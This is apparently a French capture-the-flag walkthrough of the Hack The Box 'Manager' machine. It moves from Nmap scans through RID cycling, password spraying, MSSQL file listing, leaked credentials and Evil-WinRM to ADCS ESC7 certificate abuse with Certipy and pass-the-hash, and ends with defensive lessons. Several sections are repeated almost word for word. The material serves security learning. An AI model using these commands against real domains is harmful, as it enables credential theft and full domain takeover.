![Cover](cover.png)

### 1. Scanning et Énumération de Surface

Ma reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque. La présence de services comme **Kerberos (88)**, **LDAP (389/636)** et **SMB (445)** confirme immédiatement que la cible est un **Domain Controller (DC)** Windows.

```bash
# Scan rapide des ports ouverts
nmap -p- --min-rate 10000 10.10.11.236

# Scan de services détaillé
nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -sCV 10.10.11.236
```

**Points clés identifiés :**
*   **Hostname :** DC01
*   **Domain :** `manager.htb`
*   **OS :** Windows Server 2019
*   **Services critiques :** **MSSQL (1433)** et **WinRM (5985)**.

Je mets à jour mon fichier `/etc/hosts` pour résoudre `manager.htb` et `dc01.manager.htb`.

---

### 2. Énumération Active Directory : RID Cycling

Le service **SMB** autorise les sessions anonymes ou via le compte `guest`. J'exploite cette faiblesse pour effectuer une attaque par **RID Cycling** afin d'énumérer la liste des utilisateurs du domaine.

```bash
# Énumération des utilisateurs via lookupsid
lookupsid.py guest@10.10.11.236 -no-pass
```

Cette étape me permet d'extraire une liste d'utilisateurs valides : `administrator`, `zhong`, `cheng`, `ryan`, `raven`, `jinwoo`, `chinhae`, et surtout **operator**.

> **Schéma Mental :**
> Accès Anonyme SMB -> Requêtes RPC (LSA) -> Incrémentation des Relative Identifiers (RID) -> Mapping SID vers Username -> Constitution d'une Wordlist d'utilisateurs ciblés.

---

### 3. Brèche Initiale : Password Spraying & MSSQL

Avec ma liste d'utilisateurs, je tente une attaque de **Password Spraying** basique en testant si un utilisateur utilise son propre nom comme mot de passe.

```bash
# Test de login Username == Password
netexec smb manager.htb -u users.txt -p users.txt --no-brute --continue-on-success
```

Le compte **operator:operator** est valide. Bien que ce compte n'ait pas de privilèges administratifs et ne puisse pas se connecter via **WinRM**, il possède des accès sur l'instance **MSSQL**.

Je me connecte à la base de données avec l'authentification Windows :
```bash
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
```

---

### 4. Exploration du File System via MSSQL

L'utilisateur `operator` n'a pas les droits pour activer `xp_cmdshell`, m'empêchant d'exécuter des commandes système directement. Cependant, la procédure stockée **xp_dirtree** est disponible. Elle permet de lister les fichiers et répertoires du système.

```sql
# Listing du répertoire web racine
SQL> xp_dirtree C:\inetpub\wwwroot, 1, 1
```

Je découvre un fichier inhabituel : `website-backup-27-07-23-old.zip`.

---

### 5. Extraction de Crédentiels et Premier Shell

Je télécharge l'archive depuis le serveur web (port 80) et l'analyse. Elle contient un fichier de configuration caché nommé `.old-conf.xml`.

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip
cat .old-conf.xml
```

Le fichier révèle des identifiants pour l'utilisateur **raven** :
*   **User :** `raven@manager.htb`
*   **Password :** `R4v3nBe5tD3veloP3r!123`

L'énumération **LDAP** préalable (via `ldapdomaindump`) indiquait que `raven` fait partie du groupe **Remote Management Users**. Je peux donc obtenir un shell via **WinRM**.

```bash
# Connexion via Evil-WinRM
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

> **Schéma Mental :**
> Accès MSSQL -> Fuite d'information (Information Disclosure) via xp_dirtree -> Découverte d'un Backup Web -> Analyse de fichier de config (Hardcoded Credentials) -> Pivot vers un utilisateur avec accès distant (WinRM).

---

### Énumération Interne & Mouvement Latéral

Une fois les identifiants du compte **operator** validés via **Password Spraying** (operator:operator), mon objectif est d'explorer les vecteurs de post-exploitation, notamment via le service **MSSQL** identifié lors du scan initial.

#### Énumération MSSQL & Extraction de données

Le compte **operator** dispose d'un accès au serveur **MSSQL** (port 1433). J'utilise **mssqlclient.py** avec l'authentification Windows pour interagir avec l'instance.

```bash
# Connexion à l'instance MSSQL
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb

# Vérification des privilèges et exploration du système de fichiers
SQL> xp_dirtree 'C:\', 1, 1
SQL> xp_dirtree 'C:\inetpub\wwwroot', 1, 1
```

> **Schéma Mental :**
> **Accès Initial (operator)** -> **MSSQL (xp_dirtree)** -> **Web Root Enumeration** -> **Découverte d'Archive Backup** -> **Extraction de Secrets**.

La procédure **xp_dirtree** révèle un fichier inhabituel dans le répertoire web : `website-backup-27-07-23-old.zip`. Je télécharge cette archive via le serveur HTTP (port 80).

#### Analyse du Backup & Pivot vers l'utilisateur Raven

L'archive contient un fichier de configuration caché nommé `.old-conf.xml`. Ce fichier expose des identifiants en clair pour un autre utilisateur du domaine.

```bash
# Extraction et lecture du secret
unzip website-backup-27-07-23-old.zip
cat .old-conf.xml
# Résultat : raven@manager.htb / R4v3nBe5tD3veloP3r!123
```

Je vérifie si cet utilisateur a des droits d'accès à distance via **WinRM**.

```bash
netexec winrm manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

### Escalade de Privilèges : Exploitation ADCS (ESC7)

En tant que **raven**, j'effectue une énumération des services de certificats Active Directory (**ADCS**) pour identifier des mauvaises configurations de modèles (**Certificate Templates**).

#### Énumération des vulnérabilités ADCS

J'utilise **Certipy** pour auditer les **Certificate Authorities (CA)** et les permissions associées.

```bash
certipy find -dc-ip 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

L'outil identifie une vulnérabilité de type **ESC7** sur la CA `manager-DC01-CA`. L'utilisateur **raven** possède le droit **ManageCA**, ce qui permet de prendre le contrôle total de l'autorité de certification.

> **Schéma Mental (Exploitation ESC7) :**
> **ManageCA Right** -> **Octroi du droit ManageCertificates** -> **Requête de certificat SubCA (échouée mais enregistrée)** -> **Approbation manuelle de la requête** -> **Récupération du certificat Administrator** -> **Pass-the-Certificate/NTLM Extraction**.

#### Chaîne d'attaque ESC7

1. **Élévation de privilèges sur la CA** : Je m'ajoute le droit **Manage Certificates** (Officer).
2. **Requête de certificat** : Je demande un certificat basé sur le modèle **SubCA** pour l'utilisateur **administrator**.
3. **Approbation** : En tant qu'officier de la CA, j'approuve ma propre requête en attente.
4. **Récupération** : Je télécharge le certificat finalisé.

```bash
# 1. Ajouter le rôle d'officier (Manage Certificates)
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# 2. Demander le certificat (ID de requête généré, ex: 13)
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# 3. Approuver la requête ID 13
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# 4. Récupérer le certificat au format PFX
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

#### Compromission finale (Domain Admin)

Une fois le fichier `administrator.pfx` obtenu, je l'utilise pour authentifier l'utilisateur **administrator** auprès du **Domain Controller** et extraire son hash **NTLM**.

```bash
# Synchronisation de l'heure (crucial pour Kerberos)
sudo ntpdate 10.10.11.236

# Authentification et extraction du hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236

# Accès final via Pass-the-Hash
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès établi en tant que **Raven**, ma priorité est d'énumérer les vecteurs d'élévation de privilèges au sein de l'**Active Directory**. Compte tenu de la nature de la machine, je me concentre sur l'**ADCS** (**Active Directory Certificate Services**), un vecteur d'attaque devenu critique dans les environnements Windows modernes.

#### Énumération ADCS avec Certipy

J'utilise **Certipy** pour identifier d'éventuelles vulnérabilités dans les modèles de certificats (**Certificate Templates**) ou les configurations de l'**Authority** (CA).

```bash
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

L'outil identifie une vulnérabilité de type **ESC7** sur la CA `manager-DC01-CA`. Le rapport indique que l'utilisateur **Raven** possède le droit **ManageCA**.

> **Schéma Mental :** L'exploitation **ESC7** repose sur une hiérarchie de privilèges au sein de l'**ADCS**. Si je possède le droit **ManageCA**, je peux m'octroyer le droit **Manage Certificates**. Avec ce dernier, je peux valider manuellement une requête de certificat initialement rejetée (car basée sur un template sensible comme **SubCA**), me permettant ainsi de forger une identité pour n'importe quel utilisateur du domaine, y compris l'**Administrator**.

#### Exploitation de la vulnérabilité ESC7

**1. Octroi du droit "Manage Certificates"**
Je commence par utiliser mon droit **ManageCA** pour ajouter **Raven** en tant qu'officier de délivrance (**Officer**), ce qui correspond au droit **Manage Certificates**.

```bash
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

**2. Requête du template SubCA**
Je tente de demander un certificat basé sur le template **SubCA**. Cette requête échouera initialement (accès refusé), mais générera un **Request ID** et une clé privée locale.

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
*Note : Je note le Request ID (ex: 13) et je sauvegarde la clé `13.key`.*

**3. Approbation manuelle de la requête**
Grâce à mon nouveau droit de gestion des certificats, j'approuve ma propre requête précédemment rejetée.

```bash
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

**4. Récupération du certificat Administrator**
Une fois la requête approuvée par la CA, je récupère le certificat final au format **PFX**.

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

#### Compromission Totale (Root)

Avant d'utiliser le certificat pour m'authentifier, je dois synchroniser l'horloge de mon système avec celle du **Domain Controller** pour éviter les erreurs de ticket **Kerberos**.

```bash
sudo ntpdate 10.10.11.236
```

J'utilise ensuite le fichier `administrator.pfx` pour obtenir le **NTLM Hash** du compte **Administrator**.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

L'outil me retourne le hash : `ae5064c2f62317332c88629e025924ef`. Je peux maintenant finaliser l'attaque via une session **Evil-WinRM** en utilisant la technique du **Pass-The-Hash**.

```bash
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```

#### Analyse Post-Exploitation (Beyond Root)

La compromission de cette machine met en lumière plusieurs failles structurelles :

1.  **Hygiène des mots de passe :** L'utilisation du nom d'utilisateur comme mot de passe pour le compte `operator` a permis l'accès initial au **MSSQL**.
2.  **Exposition de sauvegardes :** La présence d'une archive `.zip` dans le répertoire **webroot** contenant des fichiers de configuration sensibles (`.old-conf.xml`) est une erreur de gestion de configuration classique mais fatale.
3.  **Gouvernance ADCS :** Le vecteur **ESC7** est particulièrement furtif. Accorder le droit **ManageCA** à un utilisateur non-administrateur (Raven) revient à lui donner les clés du domaine à moyen terme. Une surveillance stricte des permissions sur les objets **PKI** dans l'**Active Directory** est indispensable.
4.  **Persistance :** Le certificat généré pour l'administrateur a une durée de validité potentiellement longue. Même si le mot de passe de l'administrateur est changé, le certificat reste valide pour l'authentification jusqu'à sa révocation ou son expiration.